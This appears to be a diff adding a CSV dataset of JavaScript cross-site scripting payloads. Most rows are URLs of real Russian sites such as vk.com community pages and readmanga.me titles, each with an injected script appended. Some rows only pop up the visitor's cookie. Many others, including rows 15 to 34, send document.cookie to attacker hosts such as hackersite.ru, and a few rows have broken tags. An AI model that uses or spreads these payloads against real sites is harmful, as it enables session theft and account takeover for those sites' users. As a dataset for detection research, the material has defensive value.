@@ -1,0 +1,59 @@
+,language,source
+0,JS,<link rel=pingback href="https://hackware.ru/xmlrpc.php"/><script> alert('xss')</script>
+1,JS,<script>img = new Image();img.src = "http://antichat.org/s/HakNet.gif?"+document.cookie;</script>
+2,JS,http://yourdomain.ru/searh?q=»><script>alert(«cookie: «+document.cookie)</script>
+3,JS,<select><script>document.write("<OPTION value=1>"+document.location.href.substring(document.location.href.indexOf("default=")+8)+"</OPTION>");
+document.write("<OPTION value=2>English</OPTION>");</script></select>
+4,JS,<script>img = new Image();img.src = "http://hack-academy.ru/vzlom/newhacker/350-xss-anatomiya-cross-site-scripting.html?"+document.cookie;</script>
+5,JS,https://vk.com/im?q=»><script>alert(«cookie: «+document.cookie)</script>
+6,JS,https://www.championat.com/other/article-3376961-plovec-mihail-muhodinov-utonul-posle-pobedy-kak-eto-bylo-kto-vinovat.html?q=»><script>alert(«cookie: «+document.cookie)</script>
+7,JS,http://bigpicture.ru/p/790398-amerikanka-pokazala-v-facebook-kak-na-samom-dele-vyglyadit-materinstvo-srazu-posle-rodov?q=»><script>alert(«cookie: «+document.cookie)</script>
+8,JS,https://www.securitylab.ru/analytics/432835.php?q=»><script>alert(«cookie: «+document.cookie)</script>
+9,JS,http://mazahaka.0pk.ru/viewtopic.php?q=»><script>alert(«cookie : «+document.cookie)</script>
+10,JS,http://xssvulns.blogspot.ru/2012/02/cookie.html?q=»><script>alert(«cookie: «+document.cookie)</script>
+11,JS,http://readmanga.me/?offset=30&max=30?q=»><script>alert(«cookie: «+document.cookie )</script>
+12,JS,http://readmanga.me/overlord?q=»><script>alert(«cookie: «+ document.cookie )</script>
+13,JS,http://readmanga.me/collection/prodavaemaia_manga?q=»><script>alert(«  cookie: «+document.cookie )</script>
+14,JS,http://findanime.me/cheburashka?q=»><script>alert(«cookie: «+document.cookie)</script>
+15,JS,http://xssvulns.blogspot.ru/2012/02/cookie.html="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+16,JS,https://github.com/GetDKAN/dkan/issues/790="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+17,JS,https://habrahabr.ru/post/66057/="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+18,JS,http://readmanga.me/collection/prodavaemaia_manga="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+19,JS,https://vk.com/worldofwarcraftofficial="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+20,JS,https://vk.com/pj_club="><script>var img=new Image();img.src="http://hackersite4.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
+21,JS,https://vk.com/bespoleznyi="><script>var img=new Image();img.src="http://hackersit22.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+22,JS,https://vk.com/club8995="><script>var img=new Image();img.src="http://hackersite1.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+23,JS,https://vk.com/relax__art="><script>var img=new Image();img.src="http://hackersite.ru/xss3.jpg?"+ encodeURI(document.cookie );</script>"
+24,JS,https://vk.com/ret_con="><script>var img=new Image();img.src="http://hackersite3.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+25,JS,https://vk.com/kinda_geek="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI( document.cookie);</script>"
+26,JS,https://vk.com/sh_ring="><script>var img=new Image();img.src="http://hackersite2.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+27,JS,https://vk.com/bestgames="><script>var img=new Image();img.src="http://hackersite.ru/xss32.jpg?"+ encodeURI(document.cookie);</script>"
+28,JS,https://vk.com/unclewyrmwood="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+29,JS,https://vk.com/dandaidaodu="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+30,JS,https://vk.com/royal.arts="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+31,JS,https://vk.com/uslc_group="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+32,JS,https://vk.com/mertvun="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+33,JS,https://vk.com/halalrecipes="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+34,JS,https://vk.com/clubk_k_k="><script>var img=new Image();img.src="http://hackersite.ru/xss.jpg?"+ encodeURI(document.cookie);</script>"
+35,JS,https://vk.com/o_ptimist?q=»><script>alert(«cookie: «+document.cookie)</script>
+36,JS,https://vk.com/nice_student?q=»><script>alert(«cookie: «+document.cookie)</script>
+37,JS,https://vk.com/megaotriv?q=»><script>alert(«cookie: «+document.cookie)</script>
+38,JS,https://vk.com/s_arcazm?q=»><script>alert(«cookie: «+document.cookie)</script>
+39,JS,https://vk.com/piter?q=»><script>alert(«cookie: «+document.cookie)</script>
+40,JS,https://vk.com/prkolist?q=»><script>alert(«cookie: «+document.cookie)</script>
+41,JS,https://vk.com/oprosnik_itmo?q=»><script>alert(«cookie: «+document.cookie)</script>
+42,JS,https://vk.com/overhearitmo?q=»><script>alert(«cookie: «+document.cookie)</script>
+43,JS,https://vk.com/proger_baby?q=»><script>alert(«cookie: «+document.cookie)</script>
+44,JS,https://vk.com/tproger?q=»><script>alert(«cookie: «+document.cookie)</script
+45,JS,https://vk.com/expartspb?q=»><script>alert(«cookie: «+document.cookie)</script>
+46,JS,http://readmanga.me/tower_of_god/?q=»><script>alert(«cookie: «+document.cookie)</script>
+47,JS,http://readmanga.me/literary_stray_dogs__dead_apple?q=»><script>alert(«cookie: «+document.cookie)</script>
+48,JS,http://readmanga.me/one_punch_man?q=»><script>alert(«cookie: «+document.cookie)</script>
+49,JS,http://readmanga.me/collection/suicid?q=»><script>alert(«cookie: «+document.cookie)</script>
+50,JS,http://readmanga.me/magi_s_grandson?q=»><script>alert(«cookie: «+document.cookie)</script>
+51,JS,http://readmanga.me/d_gray_man?q=»><script>alert(«cookie: «+document.cookie)</script>
+52,JS,http://readmanga.me/helck?q=»><script>alert(«cookie: «+document.cookie)</script>
+53,JS,http://readmanga.me/shonan_seven?q=»><script>alert(«cookie: «+document.cookie)</script>
+54,JS,http://readmanga.me/demon_king_s_counterattack_?q=»><script>alert(«cookie: «+document.cookie)</script>
+55,JS,http://readmanga.me/berserk_of_gluttony?q=»><script>alert(«cookie: «+document.cookie)</script
+56,JS,http://readmanga.me/fairytail?q=»><script>alert(«cookie: «+document.cookie)</script>
